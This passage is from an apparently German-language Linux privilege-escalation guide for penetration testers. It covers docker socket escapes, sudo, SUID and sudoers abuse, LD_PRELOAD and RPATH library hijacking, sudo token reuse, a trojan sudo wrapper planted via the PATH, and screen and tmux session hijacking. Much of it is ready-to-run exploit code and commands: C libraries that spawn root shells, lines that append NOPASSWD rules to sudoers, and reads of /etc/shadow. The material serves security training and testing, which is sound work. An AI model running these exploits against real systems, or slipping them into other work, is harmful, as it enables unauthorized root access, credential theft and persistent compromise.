docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Diese Befehle erlauben es dir, einen Container mit Root-Zugriff auf das Dateisystem des Hosts auszuführen.

#### **Docker API direkt verwenden**

In Fällen, in denen die Docker CLI nicht verfügbar ist, kann der Docker socket weiterhin über die Docker API und `curl` Befehle manipuliert werden.

1.  **List Docker Images:** Abrufen der verfügbaren Images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Sende eine Anfrage, um einen Container zu erstellen, der das Root-Verzeichnis des Hosts mountet.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Starte den neu erstellten Container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Verwende `socat`, um eine Verbindung zum Container herzustellen und die Ausführung von Befehlen innerhalb dieses Containers zu ermöglichen.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nach dem Aufbau der `socat`-Verbindung kannst du direkt im Container Befehle mit Root-Zugriff auf das Dateisystem des Hosts ausführen.

### Andere

Beachte, dass du, wenn du Schreibrechte auf den docker socket hast, weil du **in der Gruppe `docker` bist**, [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Wenn die [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Siehe **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Wenn du feststellst, dass du den **`ctr`**-Befehl verwenden kannst, lies die folgende Seite, da **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Wenn du feststellst, dass du den **`runc`**-Befehl verwenden kannst, lies die folgende Seite, da **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ist ein ausgefeiltes Interprozess-Kommunikationssystem (IPC), das Anwendungen ermöglicht, effizient miteinander zu interagieren und Daten auszutauschen. Es wurde für moderne Linux-Systeme entwickelt und bietet ein robustes Framework für verschiedene Formen der Anwendungs-Kommunikation.

Das System ist vielseitig und unterstützt grundlegende IPC-Funktionalität, die den Datenaustausch zwischen Prozessen verbessert, ähnlich wie erweiterte UNIX domain sockets. Darüber hinaus unterstützt es das Senden von Events oder Signalen, was eine nahtlose Integration zwischen Systemkomponenten fördert. Ein Beispiel: Ein Signal eines Bluetooth daemons über einen eingehenden Anruf kann einen Musikplayer dazu veranlassen, sich stummzuschalten, um die Benutzererfahrung zu verbessern. Zusätzlich bietet D-Bus ein Remote-Objektsystem, das Service-Anfragen und Methodenaufrufe zwischen Anwendungen vereinfacht und Prozesse erleichtert, die traditionell komplex waren.

D-Bus arbeitet mit einem allow/deny model, das Nachrichtenberechtigungen (Methodenaufrufe, Signal-Emissions, etc.) basierend auf der kumulativen Wirkung übereinstimmender Policy-Regeln verwaltet. Diese Policies geben an, wie mit dem Bus interagiert werden darf und können potenziell durch Ausnutzung dieser Berechtigungen zu einer Privilegieneskalation führen.

Ein Beispiel für eine solche Policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` wird gezeigt und beschreibt Berechtigungen für den root-Benutzer, `fi.w1.wpa_supplicant1` zu besitzen, an diesen zu senden und von diesem zu empfangen.

Policies ohne spezifizierten Benutzer oder Gruppe gelten universell, während "default"-Kontext-Policies für alle gelten, die nicht durch andere spezifische Policies abgedeckt sind.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Lerne hier, wie man eine D-Bus-Kommunikation enumeriert und ausnutzt:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netzwerk**

Es ist immer interessant, das Netzwerk zu erkunden und die Position der Maschine zu bestimmen.

### Generische Enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Offene Ports

Überprüfe immer Netzwerkdienste, die auf dem System laufen und mit denen du vor dem Zugriff nicht interagieren konntest:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Prüfe, ob du Traffic sniffen kannst. Wenn ja, könntest du möglicherweise Anmeldeinformationen abgreifen.
```
timeout 1 tcpdump
```
## Benutzer

### Generische Enumeration

Prüfe **wer** du bist, welche **Privilegien** du hast, welche **Benutzer** auf den Systemen vorhanden sind, welche sich **login** können und welche **root**-Privilegien haben:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Einige Linux-Versionen waren von einem Bug betroffen, der Benutzern mit **UID > INT_MAX** ermöglicht, Privilegien zu eskalieren. Mehr Info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Gruppen

Überprüfe, ob du Mitglied einer Gruppe bist, die dir root-Rechte gewähren könnte:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Zwischenablage

Prüfe, ob sich (falls möglich) etwas Interessantes in der Zwischenablage befindet
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwortrichtlinie
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn du ein Passwort der Umgebung **kennst**, versuche dich mit diesem Passwort **bei jedem Benutzer einzuloggen**.

### Su Brute

Wenn es dir nichts ausmacht, viel Lärm zu verursachen, und die Binaries `su` und `timeout` auf dem Rechner vorhanden sind, kannst du versuchen, Benutzer mittels brute-force mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) anzugreifen.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) mit dem Parameter `-a` versucht ebenfalls, Benutzer per brute-force.

## Missbrauch von beschreibbarem $PATH

### $PATH

Wenn du feststellst, dass du **in einen Ordner des $PATH schreiben kannst**, kannst du möglicherweise Privilegien eskalieren, indem du **eine backdoor in dem beschreibbaren Ordner erstellst** mit dem Namen eines Kommandos, das von einem anderen Benutzer (idealerweise root) ausgeführt wird und das **nicht aus einem Verzeichnis geladen wird, das vor** deinem beschreibbaren Ordner im $PATH liegt.

### SUDO and SUID

Du könntest berechtigt sein, einen Befehl mit sudo auszuführen oder es könnte das suid bit gesetzt haben. Überprüfe es mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Einige **unerwartete Befehle erlauben es Ihnen, Dateien zu lesen und/oder zu schreiben oder sogar einen Befehl auszuführen.** Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo-Konfiguration kann einem Benutzer erlauben, einen Befehl mit den Rechten eines anderen Benutzers auszuführen, ohne das Passwort zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen; es ist nun trivial, eine Shell zu erhalten, indem man einen ssh key in das `root`-Verzeichnis hinzufügt oder `sh` aufruft.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive erlaubt dem Benutzer, **eine Umgebungsvariable zu setzen**, während etwas ausgeführt wird:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **basierend auf HTB machine Admirer**, war **anfällig** für **PYTHONPATH hijacking**, um eine beliebige python-Bibliothek zu laden, während das script als root ausgeführt wurde:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV erhalten durch sudo env_keep → root shell

Wenn sudoers `BASH_ENV` erhält (z. B. `Defaults env_keep+="ENV BASH_ENV"`), kannst du das nicht-interaktive Startverhalten von Bash ausnutzen, um beliebigen Code als root auszuführen, wenn du einen erlaubten Befehl aufrufst.

- Warum das funktioniert: Für nicht-interaktive Shells wertet Bash `$BASH_ENV` aus und lädt (sourced) diese Datei, bevor das Zielskript ausgeführt wird. Viele sudo-Regeln erlauben das Ausführen eines Skripts oder eines Shell-Wrappers. Wenn `BASH_ENV` von sudo erhalten wird, wird deine Datei mit root-Rechten geladen.

- Voraussetzungen:
- Eine sudo-Regel, die du ausführen kannst (jedes Ziel, das `/bin/bash` nicht-interaktiv aufruft, oder jedes bash-Skript).
- `BASH_ENV` in `env_keep` vorhanden (prüfe mit `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Härtung:
- Entferne `BASH_ENV` (und `ENV`) aus `env_keep`; verwende stattdessen `env_reset`.
- Vermeide Shell-Wrapper für mit sudo erlaubte Befehle; nutze minimale Binärdateien.
- Erwäge sudo I/O-Logging und Benachrichtigungen, wenn erhaltene Umgebungsvariablen verwendet werden.

### Umgehung von sudo-Ausführungspfaden

**Springe** um andere Dateien zu lesen oder benutze **symlinks**. Zum Beispiel in der sudoers-Datei: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn ein **wildcard** verwendet wird (\*), ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary ohne Angabe des Befehls-Pfads

Wenn die **sudo permission** einem einzelnen Befehl **ohne Angabe des Pfads** zugewiesen wird: _hacker10 ALL= (root) less_ kannst du dies ausnutzen, indem du die PATH-Variable änderst.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn ein **suid** binary **einen anderen Befehl ausführt, ohne den Pfad anzugeben (prüfe immer mit** _**strings**_ **den Inhalt eines seltsamen SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary mit Befehls-Pfad

Wenn das **suid** binary **einen anderen Befehl ausführt und dabei den Pfad angibt**, kannst du versuchen, eine **Funktion zu exportieren**, die den Namen des Befehls trägt, den die suid-Datei aufruft.

Zum Beispiel, wenn ein suid binary _**/usr/sbin/service apache2 start**_ aufruft, musst du versuchen, die Funktion zu erstellen und zu exportieren:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Wenn Sie dann das suid-Binary aufrufen, wird diese Funktion ausgeführt

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die Umgebungsvariable **LD_PRELOAD** wird verwendet, um eine oder mehrere Shared Libraries (.so-Dateien) anzugeben, die vom Loader vor allen anderen geladen werden sollen, einschließlich der Standard-C-Bibliothek (`libc.so`). Dieser Vorgang ist als Preloading einer Bibliothek bekannt.

Um die Systemsicherheit zu gewährleisten und die Ausnutzung dieser Funktion zu verhindern, insbesondere bei **suid/sgid** executables, erzwingt das System jedoch bestimmte Bedingungen:

- Der Loader ignoriert **LD_PRELOAD** für executables, bei denen die real user ID (_ruid_) nicht mit der effective user ID (_euid_) übereinstimmt.
- Bei executables mit suid/sgid werden nur Bibliotheken in Standardpfaden vorgeladen, die ebenfalls suid/sgid sind.

Privilege escalation kann auftreten, wenn Sie Befehle mit `sudo` ausführen dürfen und die Ausgabe von `sudo -l` die Anweisung **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration erlaubt, dass die Umgebungsvariable **LD_PRELOAD** erhalten bleibt und selbst bei der Ausführung von Befehlen mit `sudo` berücksichtigt wird, was möglicherweise zur Ausführung beliebigen Codes mit erhöhten Rechten führen kann.
```
Defaults        env_keep += LD_PRELOAD
```
Speichere als **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dann **kompiliere es** mit:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Schließlich **escalate privileges** ausführen
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Eine ähnliche privesc kann ausgenutzt werden, wenn der Angreifer die Umgebungsvariable **LD_LIBRARY_PATH** kontrolliert, da er den Pfad bestimmt, in dem Bibliotheken gesucht werden.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wenn Sie auf ein Binary mit **SUID**-Berechtigungen stoßen, das ungewöhnlich erscheint, ist es gute Praxis zu prüfen, ob es **.so**-Dateien korrekt lädt. Das lässt sich prüfen, indem Sie folgenden Befehl ausführen:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Zum Beispiel deutet das Auftreten eines Fehlers wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ auf ein mögliches Ausnutzungspotenzial hin.

Um dies auszunutzen, erstellt man eine C-Datei, z. B. _"/path/to/.config/libcalc.c"_, die folgenden Code enthält:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code zielt, nach Kompilierung und Ausführung, darauf ab, Privilegien zu erhöhen, indem er Dateiberechtigungen manipuliert und eine shell mit erhöhten Rechten ausführt.

Kompiliere die obige C-Datei in eine Shared Object (.so) Datei mit:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Schließlich sollte das Ausführen des betroffenen SUID-Binaries den Exploit auslösen und so eine potenzielle Systemkompromittierung ermöglichen.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Da wir nun ein SUID binary gefunden haben, das eine library aus einem folder lädt, in den wir schreiben können, erstellen wir die library in diesem folder mit dem notwendigen Namen:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Wenn Sie einen Fehler wie den folgenden erhalten
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
das bedeutet, dass die Bibliothek, die du erzeugt hast, eine Funktion namens `a_function_name` enthalten muss.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binaries, die von einem Angreifer ausgenutzt werden können, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist dasselbe, aber für Fälle, in denen du in einem Befehl **nur Argumente injizieren** kannst.

Das Projekt sammelt legitime Funktionen von Unix-Binaries, die missbraucht werden können, um aus eingeschränkten Shells auszubrechen, Privilegien zu eskalieren oder aufrechtzuerhalten, Dateien zu übertragen, bind und reverse shells zu starten und andere post-exploitation Aufgaben zu erleichtern.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Wenn du auf `sudo -l` zugreifen kannst, kannst du das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu prüfen, ob es Wege findet, eine sudo-Regel auszunutzen.

### Reusing Sudo Tokens

In Fällen, in denen du **sudo access** aber nicht das Passwort hast, kannst du Privilegien eskalieren, indem du **auf die Ausführung eines sudo-Befehls wartest und dann das Session-Token kaperst**.

Requirements to escalate privileges:

- Du hast bereits eine Shell als Benutzer "_sampleuser_"
- "_sampleuser_" hat **`sudo` verwendet**, um in den **letzten 15 Minuten** etwas auszuführen (standardmäßig ist das die Dauer des sudo-Tokens, die es uns erlaubt, `sudo` zu benutzen, ohne ein Passwort einzugeben)
- `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
- `gdb` ist verfügbar (du kannst es hochladen)

(Du kannst `ptrace_scope` vorübergehend mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` aktivieren oder dauerhaft `/etc/sysctl.d/10-ptrace.conf` ändern und `kernel.yama.ptrace_scope = 0` setzen)

Wenn all diese Voraussetzungen erfüllt sind, **kannst du Privilegien eskalieren mit:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Der **erste Exploit** (`exploit.sh`) erzeugt das Binary `activate_sudo_token` in _/tmp_. Du kannst es verwenden, um **das sudo-Token in deiner Sitzung zu aktivieren** (du bekommst nicht automatisch eine root-Shell, führe `sudo su` aus):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Der **zweite exploit** (`exploit_v2.sh`) erstellt eine sh-Shell in _/tmp_, die root gehört und mit setuid versehen ist.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Der **dritte Exploit** (`exploit_v3.sh`) wird **eine sudoers file erstellen**, die **sudo tokens dauerhaft macht und allen Benutzern erlaubt, sudo zu benutzen**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Wenn du **write permissions** im Ordner oder für eine der darin erstellten Dateien hast, kannst du das Binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **create a sudo token for a user and PID**.\
Zum Beispiel: wenn du die Datei _/var/run/sudo/ts/sampleuser_ überschreiben kannst und eine Shell als dieser Benutzer mit PID 1234 hast, kannst du **obtain sudo privileges** erlangen, ohne das Passwort zu kennen, indem du:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien in `/etc/sudoers.d` konfigurieren, wer `sudo` benutzen darf und wie. Diese Dateien **können standardmäßig nur vom Benutzer root und von der Gruppe root gelesen werden**.\
**Wenn** du diese Datei **lesen** kannst, könntest du **einige interessante Informationen erhalten**, und wenn du **jede** Datei **schreiben** kannst, wirst du in der Lage sein, **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn du schreiben kannst, kannst du diese Berechtigung missbrauchen.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine andere Möglichkeit, diese Berechtigungen zu missbrauchen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zum `sudo` binary, wie `doas` für OpenBSD — denk daran, dessen Konfiguration unter `/etc/doas.conf` zu prüfen.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Wenn du weißt, dass ein **user usually connects to a machine and uses `sudo`** um Privilegien zu erhöhen und du eine Shell in diesem Benutzerkontext erhalten hast, kannst du **eine neue sudo executable** erstellen, die deinen Code als root ausführt und anschließend den Befehl des Benutzers. Dann **modify the $PATH** des Benutzerkontexts (zum Beispiel indem du den neuen Pfad in .bash_profile hinzufügst), sodass beim Ausführen von sudo durch den Benutzer deine sudo executable ausgeführt wird.

Beachte, dass du, falls der Benutzer eine andere Shell verwendet (nicht bash), andere Dateien anpassen musst, um den neuen Pfad hinzuzufügen. Zum Beispiel [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Du findest ein weiteres Beispiel in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oder so etwas ausführen:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Geteilte Bibliothek

### ld.so

Die Datei `/etc/ld.so.conf` zeigt an, **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei folgenden Pfad: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien aus `/etc/ld.so.conf.d/*.conf` gelesen werden. Diese Konfigurationsdateien **weisen auf andere Ordner hin**, in denen nach **Bibliotheken** gesucht wird. Zum Beispiel ist der Inhalt von `/etc/ld.so.conf.d/libc.conf` `/usr/local/lib`. **Das bedeutet, dass das System nach Bibliotheken innerhalb von `/usr/local/lib` suchen wird**.

Wenn aus irgendeinem Grund **ein Benutzer Schreibrechte** auf einem der angegebenen Pfade hat: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, eine Datei innerhalb von `/etc/ld.so.conf.d/` oder einen Ordner, der in einer Konfigurationsdatei innerhalb von `/etc/ld.so.conf.d/*.conf` angegeben ist, könnte er in der Lage sein, Privilegien zu eskalieren.\
Siehe **wie man diese Fehlkonfiguration ausnutzt** auf der folgenden Seite:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Indem man die lib in `/var/tmp/flag15/` kopiert, wird sie vom Programm an dieser Stelle verwendet, wie in der Variable `RPATH` angegeben.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Erstelle dann eine bösartige Bibliothek in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities stellen einem Prozess eine **Untermenge der verfügbaren root-Privilegien** zur Verfügung. Dies zerlegt effektiv die root-**Privilegien in kleinere und unterscheidbare Einheiten**. Jede dieser Einheiten kann dann unabhängig Prozessen gewährt werden. Auf diese Weise wird die volle Menge an Privilegien reduziert, wodurch das Risiko einer Ausnutzung verringert wird.\
Lies die folgende Seite, um **mehr über Capabilities und deren Missbrauchsmöglichkeiten zu erfahren**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

In einem Verzeichnis bedeutet das **Bit für "execute"**, dass der betroffene Benutzer mit "**cd**" in den Ordner wechseln kann.\
Das **"read"**-Bit bedeutet, dass der Benutzer die **Dateien** **auflisten** kann, und das **"write"**-Bit bedeutet, dass der Benutzer **Dateien löschen** und **neu erstellen** kann.

## ACLs

Access Control Lists (ACLs) stellen die sekundäre Ebene der diskretionären Berechtigungen dar und sind in der Lage, die traditionellen ugo/rwx-Berechtigungen **zu überschreiben**. Diese Berechtigungen verbessern die Kontrolle über den Zugriff auf Dateien oder Verzeichnisse, indem sie bestimmten Benutzern, die nicht Eigentümer oder Mitglieder der Gruppe sind, Rechte gewähren oder verweigern. Dieses Maß an **Granularität sorgt für eine präzisere Zugriffskontrolle**. Weitere Details finden sich [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gib** dem Benutzer "kali" Lese- und Schreibrechte für eine Datei:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Abrufen** von Dateien mit bestimmten ACLs vom System:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Offene shell sessions

In **älteren Versionen** kannst du möglicherweise eine **shell**-Session eines anderen Benutzers (**root**) **hijack**.\
In **neueren Versionen** kannst du nur noch zu **screen sessions** **connect**, und zwar nur zu denen deines **eigenen Users**. Allerdings könntest du **interesting information inside the session** finden.

### screen sessions hijacking

**screen sessions auflisten**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**An eine session anhängen**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Dies war ein Problem bei **älteren tmux-Versionen**. Ich konnte eine von root erstellte tmux (v2.1)-Session nicht als nicht-privilegierter Benutzer hijacken.

**tmux-Sessions auflisten**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**An eine session anhängen**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Siehe **Valentine box von HTB** als Beispiel.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- und SSH keys, die auf Debian-basierten Systemen (Ubuntu, Kubuntu, etc) zwischen September 2006 und dem 13. Mai 2008 erzeugt wurden, können von diesem Bug betroffen sein.\
Dieser Bug tritt beim Erstellen eines neuen ssh key in diesen OS auf, da **nur 32.768 Varianten möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und **wenn Sie den ssh public key haben, können Sie nach dem entsprechenden private key suchen**. Die berechneten Möglichkeiten finden Sie hier: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interessante Konfigurationswerte

- **PasswordAuthentication:** Legt fest, ob Passwort-Authentifizierung erlaubt ist. Der Standard ist `no`.
- **PubkeyAuthentication:** Legt fest, ob public key authentication erlaubt ist. Der Standard ist `yes`.
